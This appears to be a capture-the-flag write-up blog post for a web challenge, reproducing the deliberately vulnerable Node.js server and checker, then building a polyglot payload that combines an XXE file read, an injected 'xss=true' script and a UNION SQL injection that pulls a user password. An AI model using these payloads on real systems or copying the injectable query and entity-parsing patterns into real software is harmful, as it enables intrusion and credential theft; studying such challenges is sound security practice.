---
title: "a-payload-to-rule-them-all"
date: 2020-06-08
tags: [web]
draft: false
---
This one gives us a post endpoint for a payload that needs to exploit xxe, xss,
and sqli (sql injection), as well as the code for the server.

```server.js
const express = require("express")
const app = express()
const bodyParser = require("body-parser")
const port = 31337
const { execFile } = require("child_process")
const fs = require("fs")
const rateLimit = require("express-rate-limit");
app.use(express.static("static"))
app.use(bodyParser.urlencoded({ extended: true }))
const limiter = rateLimit({ windowMs: 10 * 60 * 1000, max: 50 });
// 15 minutes  // limit each IP to 100 requests per windowMs 
app.use('/', limiter);
app.post('/', (req, res) => {
    const test_payload = execFile("/usr/sbin/gosu", ["gnx", "/home/gnx/script/test_payload.js",
        req.body.payload], (error, stdout, stderr) => {
            if (stdout.toString().trim() === "parabens hackudo") {
                res.send(process.env.FLAG)
            } else { 
                res.send("nope") 
            }
        }); 
        console.log(req.body.payload)
})
app.get('/source', (req, res) => {
    var out = "/usr/src/app/index.js :\n\n" +
        fs.readFileSync("/usr/src/app/index.js").toString() +
        "\n\n"
    out += "/home/gnx/script/test_payload.js :\n\n" +
        fs.readFileSync("/home/gnx/script/test_payload.js") +
        "\n\n"
    res.send(out)
})

app.listen(port, '0.0.0.0', () => console.log(`Chall rodando em http://localhost:${port}`))
```

as well as the `test_payload.js` referenced above:

```test_payload.js
#!/usr/bin /env node
const puppeteer = require('puppeteer')
const mysql = require("mysql")
const util = require('util')
const libxml = require("libxmljs")
const fs = require("fs")
const sanitizeHtml = require("sanitize-html")

function test_xxe(payload) {
    try {
        var my_secret = Math.random().toString(36).substring(2);
        fs.writeFileSync("/home/gnx/script/xxe_secret", my_secret)
        var doc = libxml.parseXml(payload, { noent: true, nonet: true })
        return doc.toString().includes(my_secret)
    } catch (e) { return false }
}

async function test_xss(payload) {
    try {
        const browser = await puppeteer.launch({
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-accelerated-2d-canvas', '--no-first-run', '--no-zygote', '--single-process', '--disable-gpu']
        })
        const page = await browser.newPage()
        page.setDefaultNavigationTimeout(1000);
        payload = sanitizeHtml(payload, { allowedTags: [] })
        await page.goto(`data:text/html,<script>${payload}</script>`)
        const check = await page.evaluate("( typeof xss != 'undefined' ? true : false )")
        // vlw herrera
        await browser.close()
        return check
    } catch (error) {
        console.error(error)
    }
}

async function test_sqli(payload) {
    var connection = mysql.createConnection({
        host: process.env.MYSQL_HOST || "127.0.0.1",
        user: process.env.MYSQL_USER,
        password: process.env.MYSQL_PASSWORD,
        database: process.env.MYSQL_DATABASE,
        charset: 'utf8',
        dialectOptions: { collate: 'utf8_general_ci', },
    })
    const query = util.promisify(connection.query).bind(connection)
    connection.connect()
    const users = await query("SELECT * from users")
    try {
        const sqli = await query(`SELECT * from posts where id='${payload}'`)
        await connection.end()
        return JSON.stringify(sqli).includes(users[0]["password"])
    } catch (e) {
        return false
    }
}

function main(args) {
    var xss = test_xss(args[0])
    var sqli = test_sqli(args[0])
    var xxe = test_xxe(args[0])
    Promise.all([xss, sqli]).then(function (values) {
        if (values[0] && values[1] && xxe) {
            console.log("parabens hackudo")
        } else {
            console.log("hack harder")
        }
        process.exit(0)
    })
}
main(process.argv.slice(2))
```

I realized I'd need something that parsed as valid js, valid sqli, and valid
xml, to some extent, which was the hardest part of the puzzle.

The xml attack was pretty easy to test locally and pretty easy to come up with.
As simple as this:

```payload.xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret"><r>&xxe;</r>
```

Next, getting some validly parsing sql by ending the quote, and tacking
a comment on the end with `#`:

```payload.xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret"><r>&xxe;</r>
<!--' union select password from users limit 1;#-->
```

It was a bit of a struggle to get the js to work (need to inject `xss=true;`), even with the assist of
sanitize-html. The sanitize-html call basically stripped out all of the xml 
and comments, which was mostly helpful, so something like this almost works:

```
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret"><r>;xss=true;//&xxe;</r>
<!--' union select password from users limit 1;#-->
```

But you end up with something like: `]>;xss=true;//&xxe;` and the `];` doesn't
run.

I spent a while struggling with this piece, until a teammate suggested trying
another entity to inject a comment around the garbage:

```
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret">
<!ENTITY xxe2 SYSTEM "xxe_seed>/*">]><r>*/xss=true;//&xxe;</r>
<!--' union select password from users;#-->
```

And the last piece was figuring out how many columns was in the posts table, so
we could match the union injection--took a few tries, but I just tacked on `,1`
until it ran and gave the flag. I think it was 4 columns, but don't remember at
this point. The `limit 1` isn't necessary but it seemed kind not to pull in the whole
table cartesian product ;) --the result was something like this:

```
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret">
<!ENTITY xxe2 SYSTEM "xxe_seed>/*">]><r>*/xss=true;//&xxe;</r>
<!--' union select password, 1, 1, 1 from users limit 1;#-->
```
